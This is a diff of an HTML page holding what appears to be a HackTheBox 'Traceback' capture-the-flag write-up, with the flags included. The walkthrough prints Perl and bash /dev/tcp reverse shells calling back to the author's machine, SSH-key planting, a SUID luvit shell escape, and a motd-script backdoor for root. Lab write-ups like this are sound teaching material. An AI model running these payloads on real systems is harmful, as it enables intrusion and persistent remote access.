@@ -59,19 +59,51 @@
 			<h1 class="title">HackTheBox Traceback Write Up w/o Metasploit</h1>
 			<div class="meta">Posted at &mdash; Aug 18, 2020</div>
 		</div>
-		              
+
+		
+		<div class="toc">              
+			<h3>Table of Contents</h3>
+			<nav id="TableOfContents">
+  <ul>
+    <li><a href="https://ajdin.io/posts/htb/traceback/#reconnaissance">Reconnaissance</a></li>
+    <li><a href="https://ajdin.io/posts/htb/traceback/#getting-user">Getting user</a>
+      <ul>
+        <li><a href="https://ajdin.io/posts/htb/traceback/#smevkphp">Smevk.php</a></li>
+        <li><a href="https://ajdin.io/posts/htb/traceback/#ssh-keygen">ssh-keygen</a></li>
+        <li><a href="https://ajdin.io/posts/htb/traceback/#enumeration">Enumeration</a></li>
+        <li><a href="https://ajdin.io/posts/htb/traceback/#luvit-privilege-escalation">Luvit privilege escalation</a></li>
+      </ul>
+    </li>
+    <li><a href="https://ajdin.io/posts/htb/traceback/#getting-root">Getting Root</a></li>
+  </ul>
+</nav>
+			<hr>
+		</div>              
+		
+		</aside>              
 
 		<div class="markdown">
               		
 <p>Traceback is an easy Linux box created by Xh4H. You have to enter a shell planted on the server, enter as webadmin, escalate privileges with lua/luvit to sysadmin and echo a reverse shell in 00-header file to get root access. If you have any questions you can find me on twitter @ajdintrejic.</p>
 <h2 id="reconnaissance">Reconnaissance<a class="anchor" href="#reconnaissance">#</a></h2>
 <p>Let’s run a quick nmap and full nmap scan in background:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">#top 1000 ports
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">#top 1000 ports
 sudo nmap -sV -sC -O -oA nmap/initial 10.10.10.181
 
 #all ports
 sudo nmap -p- -sV -sC -O -oA nmap/full 10.10.10.181  
-</code></pre></div><ul>
+</code></pre></td></tr></table>
+</div>
+</div><ul>
 <li>-sC: run default script scan</li>
 <li>-sV: probe open ports to determine service/version info</li>
 <li>-O: OS detection</li>
@@ -84,8 +116,15 @@ sudo nmap -p- -sV -sC -O -oA nmap/full 10.10.10.181
 <p>There is no <code>robots.txt</code> , but there is a comment that might be useful.</p>
 <p><img src="/htb/traceback/comment.png" alt=""></p>
 <p>I’ll also ran gobuster:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.181 -x php,html -t 100
-</code></pre></div><p>But before it was finished I found out the next step. It also had a lot of errors (due to having a bad connection). So I won’t paste it here as it’s not important.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.181 -x php,html -t 100
+</code></pre></td></tr></table>
+</div>
+</div><p>But before it was finished I found out the next step. It also had a lot of errors (due to having a bad connection). So I won’t paste it here as it’s not important.</p>
 <h2 id="getting-user">Getting user<a class="anchor" href="#getting-user">#</a></h2>
 <p>We can assume the hacker left in a shell by that comment. We can google that comment and find a repo containing some web shells.</p>
 <p><img src="/htb/traceback/gitrepo.png" alt=""></p>
@@ -102,10 +141,30 @@ sudo nmap -p- -sV -sC -O -oA nmap/full 10.10.10.181
 <h4 id="reverse-shell-as-webadmin">Reverse shell as webadmin</h4>
 <p>I couldn’t get it to work with nc but I did it with a perl reverse script from <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">here</a>.</p>
 <p>Start a nc listener for reverse shell on your local machine (I used port 1233) with:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">sudo nc -lvnp 1233 
-</code></pre></div><p><img src="/htb/traceback/nc.png" alt=""></p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">sudo nc -lvnp 1233 
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="/htb/traceback/nc.png" alt=""></p>
 <p>On backdoor webpage execute the payload but make sure to edit the IP and port.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-perl" data-lang="perl">perl <span style="color:#f92672">-</span>e <span style="color:#e6db74">&#39;use Socket;
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-perl" data-lang="perl">perl <span style="color:#f92672">-</span>e <span style="color:#e6db74">&#39;use Socket;
 </span><span style="color:#e6db74">$i=&#34;10.10.15.209&#34;;
 </span><span style="color:#e6db74">$p=1233;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));
 </span><span style="color:#e6db74">if(connect(S,sockaddr_in($p,inet_aton($i)))){
@@ -114,14 +173,48 @@ sudo nmap -p- -sV -sC -O -oA nmap/full 10.10.10.181
 </span><span style="color:#e6db74">	open(STDERR,&#34;&gt;&amp;S&#34;);
 </span><span style="color:#e6db74">	exec(&#34;/bin/sh -i&#34;);
 </span><span style="color:#e6db74">};&#39;</span>
-</code></pre></div><p><img src="/htb/traceback/nc2.png" alt=""></p>
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="/htb/traceback/nc2.png" alt=""></p>
 <p>After executing that command we will get a sh shell as webmin:</p>
 <p><img src="/htb/traceback/nc3.png" alt=""></p>
 <p>We can cat /etc/passwd and see that we have to get into the sysadmin account.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">sysadmin:x:1001:1001::/home/sysadmin:/bin/sh
-</code></pre></div><h3 id="ssh-keygen">ssh-keygen<a class="anchor" href="#ssh-keygen">#</a></h3>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">sysadmin:x:1001:1001::/home/sysadmin:/bin/sh
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="ssh-keygen">ssh-keygen<a class="anchor" href="#ssh-keygen">#</a></h3>
 <p>Let’s create out ssh keys while we’re here.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ ssh-keygen
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ ssh-keygen
 Generating public/private rsa key pair.
 Enter file in which to save the key (/home/webadmin/.ssh/id_rsa): 
 Enter passphrase (empty for no passphrase): 
@@ -142,59 +235,144 @@ The key&#39;s randomart image is:
 |o o        o ++  |
 | o..        +..  |
 +----[SHA256]-----+
-</code></pre></div><p>Copy the private key id_rsa to your machine and add the public key id_rsa.pub into authorized keys with</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">echo &#34;\n\n&#34; &gt;&gt; authorized_keys
+</code></pre></td></tr></table>
+</div>
+</div><p>Copy the private key id_rsa to your machine and add the public key id_rsa.pub into authorized keys with</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">echo &#34;\n\n&#34; &gt;&gt; authorized_keys
 cat id_rsa.pub &gt;&gt; authorized_keys
-</code></pre></div><p>We can ssh into the box now.</p>
+</code></pre></td></tr></table>
+</div>
+</div><p>We can ssh into the box now.</p>
 <p><img src="/htb/traceback/nc4.png" alt=""></p>
 <h3 id="enumeration">Enumeration<a class="anchor" href="#enumeration">#</a></h3>
 <p>Grab linPEAS.sh and LinEnum.sh and create a new folder with an http server running, on your local machine.</p>
 <p><img src="/htb/traceback/python.png" alt=""></p>
 <p>After this we can grab the files and run them on the server. I created a /tmp/ajdin and pulled these files with wget :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">wget http://10.10.15.209:1232/LinEnum.sh
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">wget http://10.10.15.209:1232/LinEnum.sh
 wget http://10.10.15.209:1232/linpeas.sh
-</code></pre></div><p>Looking at the output of linpeas.sh I’ve found 3 things:</p>
+</code></pre></td></tr></table>
+</div>
+</div><p>Looking at the output of linpeas.sh I’ve found 3 things:</p>
 <ul>
 <li>We have a file /home/webadmin/note.txt</li>
 <li>If we can get sysadmin account we can probably escalate privileges to root with files/scripts found in /etc/update-motd.d/</li>
 <li>We have a SUID binary /home/sysadmin/luvit which we can run as webadmin</li>
 </ul>
 <p>We can check out the note first:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ cat /home/webadmin/note.txt
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ cat /home/webadmin/note.txt
 - sysadmin -
 I have left a tool to practice Lua.
 I&#39;m sure you know where to find it.
 Contact me if you have any question.
-</code></pre></div><p>Okay, let’s remember lua, and carry on. The /etc/update-motd.d/ dir contains a script file 00-header</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ cat 00-header
+</code></pre></td></tr></table>
+</div>
+</div><p>Okay, let’s remember lua, and carry on. The /etc/update-motd.d/ dir contains a script file 00-header</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ cat 00-header
 &lt;removed, not important&gt;[ -r /etc/lsb-release ] &amp;&amp; . /etc/lsb-release
 echo &#34;\nWelcome to Xh4H land \n&#34;
-</code></pre></div><p>but wait we’ve seen this text before, when we ssh’d into the box.</p>
+</code></pre></td></tr></table>
+</div>
+</div><p>but wait we’ve seen this text before, when we ssh’d into the box.</p>
 <p><img src="/htb/traceback/ssh.png" alt=""></p>
 <p>So can we get code execution here as root? Let’s first get sysadmin account so we can write to this file. We are left with SUID binary which has no entry in GTFOBin, but we can Google and see what it does.</p>
 <h3 id="luvit-privilege-escalation">Luvit privilege escalation<a class="anchor" href="#luvit-privilege-escalation">#</a></h3>
 <p><img src="/htb/traceback/luvit.png" alt=""></p>
 <p>Wait so it has to do something with lua? If we check lua on GTFOBin, we can spawn a shell and escalate privileges:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">lua -e &#39;os.execute(&#34;/bin/sh&#34;)&#39;
-</code></pre></div><p>but we have luvit so let’s try</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ sudo -u sysadmin /home/sysadmin/luvit -e &#39;os.execute(&#34;/bin/sh&#34;)&#39;
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">lua -e &#39;os.execute(&#34;/bin/sh&#34;)&#39;
+</code></pre></td></tr></table>
+</div>
+</div><p>but we have luvit so let’s try</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ sudo -u sysadmin /home/sysadmin/luvit -e &#39;os.execute(&#34;/bin/sh&#34;)&#39;
 sh: turning off NDELAY mode
 whoami
 sysadmin
-</code></pre></div><p>We can now get the flag and continue:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">cat user.txt
+</code></pre></td></tr></table>
+</div>
+</div><p>We can now get the flag and continue:</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">cat user.txt
 addd2ba938b3b4bf2e15374f413aee04
-</code></pre></div><h2 id="getting-root">Getting Root<a class="anchor" href="#getting-root">#</a></h2>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="getting-root">Getting Root<a class="anchor" href="#getting-root">#</a></h2>
 <p>Amazing. Now let’s get back to that /etc/upadate-motd.d/ dir as sysadmin and try to get code execution as root:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ echo “whoami” &gt;&gt; 00-header
-</code></pre></div><p><img src="/htb/traceback/root.png" alt=""></p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ echo “whoami” &gt;&gt; 00-header
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="/htb/traceback/root.png" alt=""></p>
 <p>For some reason you can’t make your ssh keys for this user. Anyway, we’ll insert the reverse shell bash payload into the 00-header .</p>
 <p>First start netcat listener on port 1250 nc -lvnp 1250 . Now insert the reverse shell payload:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">echo &#34;/bin/bash -c &#39;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.136/1250 0&gt;&amp;1&#39;&#34; &gt;&gt; 00-header
-</code></pre></div><p>And log back in. Now our netcat listener has a shell.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">root@traceback:/# cat /root/root.txt
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">echo &#34;/bin/bash -c &#39;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.136/1250 0&gt;&amp;1&#39;&#34; &gt;&gt; 00-header
+</code></pre></td></tr></table>
+</div>
+</div><p>And log back in. Now our netcat listener has a shell.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">root@traceback:/# cat /root/root.txt
 2218cd7369604176712a79ad09dd5414
-</code></pre></div><p>Thanks for reading. If you have any questions feel free to reach out to me on Twitter @ajdintrejic.</p>
+</code></pre></td></tr></table>
+</div>
+</div><p>Thanks for reading. If you have any questions feel free to reach out to me on Twitter @ajdintrejic.</p>
 
 
 		</div>
